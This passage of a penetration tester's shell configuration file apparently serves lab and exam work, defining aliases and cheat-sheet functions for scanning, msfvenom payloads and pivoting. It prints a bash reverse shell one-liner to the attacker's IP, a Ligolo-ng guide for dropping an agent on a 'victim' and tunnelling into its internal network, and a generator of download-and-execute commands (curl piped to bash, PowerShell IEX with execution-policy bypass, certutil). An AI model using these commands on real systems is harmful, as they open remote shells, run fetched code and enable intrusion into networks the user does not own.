│   nico.msf.win64                    → Auto LHOST, port 4444                 │
│   nico.msf.win64 10.10.14.5         → Custom LHOST                          │
│   nico.msf.win64 10.10.14.5 5555    → Custom LHOST and port                │
│   nico.msf.php 10.10.14.5 443 rev.php → Full custom                         │
│                                                                              │
│ nico.msf.list             → Show detailed payload list                      │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ REVERSE SHELLS ─────────────────────────────────────────────────────────────┐
│ nico.rev.bash            → Bash reverse shell one-liner                     │
│                            bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ SCANNING ───────────────────────────────────────────────────────────────────┐
│ nico.nmap <IP>           → Full TCP scan (-p- -sS -sCV --min-rate 5000)     │
│ nico.nmap.udp <IP>       → UDP scan (-sU -sS -sC -sV -oA nmap.udp)          │
│ nico.rust <IP>           → RustScan discovery → nmap (-sS -sCV)             │
│ nico.rust.slow <IP>      → RustScan for tunnels (low batch/high timeout)    │
│ rustscan <IP> -- -sV -sC → One-liner: discovery + nmap direct               │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ AUTORECON ──────────────────────────────────────────────────────────────────┐
│ nico.autorecon <IP> -o ~/obsidian → Full AutoRecon (includes long plugins)  │
│ nico.autorecon.short <IP>         → Quick AutoRecon (excludes long plugins) │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ HELP ───────────────────────────────────────────────────────────────────────┐
│ nico.banner | nico.cheat → Show this banner                                 │
│ nico.msf.list            → Detailed msfvenom payload list                   │
│ nico.ligolo.cheat        → Ligolo-ng pivoting guide                         │
└──────────────────────────────────────────────────────────────────────────────┘

EOF
}
nico.banner
########## END ##########
# cheat sheet
alias nico.cheat=nico.banner

# Ligolo-ng Cheatsheet
nico.ligolo.cheat() {
  local ip=$(nico.myip)
  local port="${1:-11601}"
cat <<EOF
╔══════════════════════════════════════════════════════════════════════════════╗
║                      🐉 LIGOLO-NG PIVOT CHEATSHEET 🐉                        ║
╚══════════════════════════════════════════════════════════════════════════════╝

┌─ OVERVIEW ───────────────────────────────────────────────────────────────────┐
│ Ligolo-ng creates a tunneling interface to pivot through compromised hosts   │
│ Components: Proxy (attacker) + Agent (victim)                                │
│ Your IP: ${ip} | Port: ${port}                                       │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ STEP 1: ATTACKER SETUP (Proxy Server) ─────────────────────────────────────┐
│ 1. Start the proxy with self-signed cert:                                   │
│    sudo ./proxy -selfcert                                                    │
│                                                                              │
│ 2. Create tunnel interface (in ligolo-ng prompt):                           │
│    ligolo-ng » interface_create --name "ligolo"                             │
│                                                                              │
│ Note: Keep this terminal open, proxy must stay running                      │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ STEP 2: VICTIM SETUP (Agent Client) ───────────────────────────────────────┐
│ 1. Transfer agent to victim:                                                │
│    wget http://${ip}:8000/agent                                      │
│                                                                              │
│ 2. Make executable:                                                          │
│    chmod +x agent                                                            │
│                                                                              │
│ 3. Connect back to attacker proxy:                                          │
│    ./agent -connect ${ip}:${port} -ignore-cert                      │
│                                                                              │
│ Expected output:                                                             │
│    WARN[0000] warning, certificate validation disabled                      │
│    INFO[0000] Connection established    addr="${ip}:${port}"        │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ STEP 3: ACTIVATE TUNNEL (Attacker) ────────────────────────────────────────┐
│ 1. Select the active session:                                               │
│    ligolo-ng » session                                                       │
│    ? Specify a session: 1 - root@victim - 172.20.0.235:33084               │
│                                                                              │
│ 2. Start the tunnel:                                                         │
│    [Agent : root@victim] » tunnel_start --tun ligolo                        │
│                                                                              │
│ 3. View victim's network interfaces:                                        │
│    [Agent : root@victim] » ifconfig                                          │
│                                                                              │
│ 4. Add route to victim's internal network:                                  │
│    [Agent : root@victim] » interface_add_route --name ligolo \              │
│                            --route 192.168.1.0/24                            │
│    INFO[0430] Route created.                                                │
│                                                                              │
│ Now you can access 192.168.1.0/24 directly from attacker!                   │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ STEP 4: PORT FORWARDING (Optional) ─────────────────────────────────────────┐
│ Forward traffic from attacker to victim's localhost services:               │
│                                                                              │
│ [Agent : user@victim] » listener_add --addr 0.0.0.0:4443 \                  │
│                         --to 127.0.0.1:4443 --tcp                            │
│                                                                              │
│ Example: Access victim's local port 4443 via attacker's 4443                │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ COMMON COMMANDS ────────────────────────────────────────────────────────────┐
│ Proxy (Attacker):                                                            │
│   session                     → List/select active sessions                 │
│   interface_create --name X   → Create tunnel interface                     │
│   interface_add_route ...     → Add route to internal network               │
│   tunnel_start --tun X        → Start tunnel on interface                   │
│   tunnel_stop                 → Stop active tunnel                          │
│                                                                              │
│ Agent (Victim):                                                              │
│   ifconfig                    → Show network interfaces                     │
│   listener_add ...            → Create port forward                         │
│   listener_list               → Show active listeners                       │
│   listener_stop --id X        → Stop listener                               │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ WORKFLOW SUMMARY ───────────────────────────────────────────────────────────┐
│ Attacker: sudo ./proxy -selfcert                                            │
│           interface_create --name "ligolo"                                  │
│                                                                              │
│ Victim:   ./agent -connect ${ip}:${port} -ignore-cert               │
│                                                                              │
│ Attacker: session → select agent                                            │
│           tunnel_start --tun ligolo                                          │
│           ifconfig → see victim networks                                     │
│           interface_add_route --name ligolo --route TARGET_NET/CIDR         │
│                                                                              │
│ Result:   Direct access to victim's internal network from attacker          │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ TROUBLESHOOTING ────────────────────────────────────────────────────────────┐
│ • Agent won't connect: Check firewall rules on port ${port}                 │
│ • No route to network: Verify CIDR and interface name match                 │
│ • Tunnel not working: Ensure sudo for proxy and tunnel_start executed       │
│ • Port forward fails: Check if port is available on both sides              │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ QUICK COPY-PASTE ──────────────────────────────────────────────────────────┐
│ Attacker proxy:  sudo ./proxy -selfcert                                     │
│ Victim agent:    ./agent -connect ${ip}:${port} -ignore-cert        │
│ Transfer agent:  wget http://${ip}:8000/agent && chmod +x agent     │
└──────────────────────────────────────────────────────────────────────────────┘

EOF
}


# _______________________________________________________________________________________

# Generate download cheatsheet for any file
nico.srv.cheat() {
    if [ $# -eq 0 ]; then
        echo "Usage: cheat <filename> [port] [ip]"
        echo "Example: cheat mimikatz.exe"
        echo "         cheat linpeas.sh 8080"
        echo "         cheat exploit.py 8080 10.10.10.5"
        return 1
    fi
    
    local FILE="$1"
    local PORT="${2:-80}"
    local IP="${3:-$(ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1)}"
    
    if [ -z "$IP" ]; then
        IP="IP_KALI"
    fi
    
    local is_exe=false
    local is_ps1=false
    local is_sh=false
    
    [[ "$FILE" == *.exe ]] && is_exe=true
    [[ "$FILE" == *.ps1 ]] && is_ps1=true
    [[ "$FILE" == *.sh ]] && is_sh=true
    
    echo ""
    echo "╔════════════════════════════════════════════════════════════════════════════════╗"
    echo "║                          📡 DOWNLOAD CHEATSHEET                                ║"
    echo "╚════════════════════════════════════════════════════════════════════════════════╝"
    echo ""
    echo "File: $FILE"
    echo "URL:  http://$IP:$PORT/$FILE"
    echo ""
    
    if $is_exe || (! $is_ps1 && ! $is_sh); then
        echo "#### 📦 WINDOWS DOWNLOAD"
        echo "----"
        echo "##### PowerShell"
        echo "    IWR http://$IP:$PORT/$FILE -OutFile $FILE"
        echo "    wget http://$IP:$PORT/$FILE -O $FILE"
        echo "    (New-Object Net.WebClient).DownloadFile('http://$IP:$PORT/$FILE','$FILE')"
        echo ""
        echo "##### CMD"
        echo "    certutil -urlcache -f http://$IP:$PORT/$FILE $FILE"
        echo "    bitsadmin /transfer job http://$IP:$PORT/$FILE %CD%\\$FILE"
        echo ""
    fi
    
    if $is_exe; then
        echo "##### Download + Execute"
        echo "    IWR http://$IP:$PORT/$FILE -OutFile $FILE; .\\$FILE"
        echo "    powershell -c \"IWR http://$IP:$PORT/$FILE -O $FILE; .\\$FILE\""
        echo ""
    fi
    
    if $is_ps1; then
        echo "##### PowerShell Script Execution"
        echo "    IEX(IWR http://$IP:$PORT/$FILE -UseBasicParsing)"
        echo "    IEX(New-Object Net.WebClient).DownloadString('http://$IP:$PORT/$FILE')"
        echo "    powershell -ep bypass -c \"IEX(IWR http://$IP:$PORT/$FILE -UseBasicParsing)\""
        echo ""
    fi
    
    echo "#### 🐧 LINUX DOWNLOAD"
    echo "----"
    echo "    wget http://$IP:$PORT/$FILE -O $FILE"
    echo "    curl http://$IP:$PORT/$FILE -o $FILE"
    echo "    curl -O http://$IP:$PORT/$FILE"
    echo ""
    
    if $is_sh; then
        echo "##### Download + Execute"
        echo "    curl http://$IP:$PORT/$FILE | bash"
        echo "    wget -qO- http://$IP:$PORT/$FILE | bash"
        echo "    bash <(curl -s http://$IP:$PORT/$FILE)"
        echo ""
        echo "##### Source/Execute"
        echo "    . <(curl http://$IP:$PORT/$FILE)"
        echo "    source <(curl -s http://$IP:$PORT/$FILE)"
        echo ""
    fi
    
    if ! $is_ps1 && ! $is_sh; then
        echo "##### Download + Execute (binary)"
        echo "    wget http://$IP:$PORT/$FILE -O $FILE && chmod +x $FILE && ./$FILE"
        echo "    curl http://$IP:$PORT/$FILE -o $FILE && chmod +x $FILE && ./$FILE"
        echo ""
    fi
    
    echo "#### 💡 ALTERNATIVE METHODS"
    echo "----"
    echo "##### Python"
    echo "    python -c \"import urllib;urllib.urlretrieve('http://$IP:$PORT/$FILE','$FILE')\""
    echo "    python3 -c \"import urllib.request;urllib.request.urlretrieve('http://$IP:$PORT/$FILE','$FILE')\""
    echo ""
    echo "##### Netcat Transfer"
    echo "    [Server] nc -lvnp $PORT < $FILE"
    echo "    [Target] nc $IP $PORT > $FILE"
    echo ""
    echo "##### /dev/tcp (bash)"
    echo "    exec 3<>/dev/tcp/$IP/$PORT"
    echo "    echo -e \"GET /$FILE HTTP/1.0\\n\" >&3"
    echo "    cat <&3 > $FILE"
    echo ""
}



# Kill httpTempServ instances interactively
nico.srv.kill() {
    # Find all running httpTempServ processes
    local pids=($(pgrep -f 'httpTempServ'))
    
    if [ ${#pids[@]} -eq 0 ]; then
        echo "❌ No httpTempServ instances running"
        return 1
    fi
    
    echo ""
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║           🔴 Running httpTempServ Instances                    ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo ""
    
    # Display running instances with details
    local i=1
    local -A pid_map
    
    for pid in "${pids[@]}"; do
        # Get port and directory info
        local port=$(ss -tlnp 2>/dev/null | grep "pid=$pid" | awk '{print $4}' | rev | cut -d':' -f1 | rev | head -1)
        local cmdline=$(ps -p $pid -o args= 2>/dev/null)
        local cwd=$(pwdx $pid 2>/dev/null | cut -d' ' -f2-)
        
        if [ -z "$port" ]; then
            port="N/A"
        fi
        
        echo "[$i] PID: $pid"
        echo "    Port: $port"
        echo "    Dir:  $cwd"
        echo "    Cmd:  $cmdline"
        echo ""
        
        pid_map[$i]=$pid
        ((i++))
    done
    
    # Show options
    echo "Options:"
    echo "  [1-${#pids[@]}] Kill specific instance"
    echo "  [a]         Kill all instances"
    echo "  [q]         Cancel"
    echo ""
    
    # Read user choice
    echo -n "Choose: "
    read choice
    
    case $choice in
        q|Q)
            echo "❌ Cancelled"
            return 0
            ;;
        a|A)
            echo ""
            echo "💀 Killing all httpTempServ instances..."
            for pid in "${pids[@]}"; do
                kill $pid 2>/dev/null && echo "  ✓ Killed PID $pid" || echo "  ✗ Failed to kill PID $pid"
            done
            echo ""
            return 0
            ;;
        [0-9]*)
            if [ -n "${pid_map[$choice]}" ]; then
                local target_pid=${pid_map[$choice]}
                echo ""
                echo "💀 Killing PID $target_pid..."
                kill $target_pid 2>/dev/null && echo "  ✓ Killed successfully" || echo "  ✗ Failed to kill"
                echo ""
                return 0
            else
                echo "❌ Invalid choice: $choice"
                return 1
            fi
            ;;
        *)
            echo "❌ Invalid option: $choice"
            return 1
            ;;
    esac
}


# _______________________________________________________________________________________

# Created by `pipx` on 2024-12-14 17:18:39
export PATH="$PATH:/home/kali/.local/bin"

# Autorecon
#nico.autorecon='sudo $(which autorecon) -vv'
#nico.autorecon.short='sudo $(which autorecon)  -vv --exclude-tags="long"'
#alias autorecon='sudo env "PATH=$PATH" autorecon'
# Autorecon (larga)
nico.autorecon() {
  sudo sh -c "umask 0022 && $(which autorecon) -vv $*"
}

# Autorecon (corta, sin long)
nico.autorecon.short() {
  sudo sh -c "umask 0022 && $(which autorecon) -vv --exclude-tags='long' $*"
}


# Wrapper docker: ajusta ulimit dentro del contenedor y pasa args
rustscan() {
  # opcional: intentamos subir soft limit en host (sirve para nmap local u otros procesos)
  ulimit -n 5000 2>/dev/null || true

  # Ejecuta el contenedor y establece nofile en container (soft:hard)
  docker run -it --rm --network host \
    --ulimit nofile=5000:5000 \
    --entrypoint rustscan \
    rustscan/rustscan:2.3.0 "$@"
}


# Keys ES
setxkbmap -layout es

#  Target global
[ -f ~/.targetrc ] && source ~/.targetrc
export PATH="$HOME/.local/bin:$PATH"


# ls nice icons
#alias ls='eza -la --sort=time --reverse --icons'
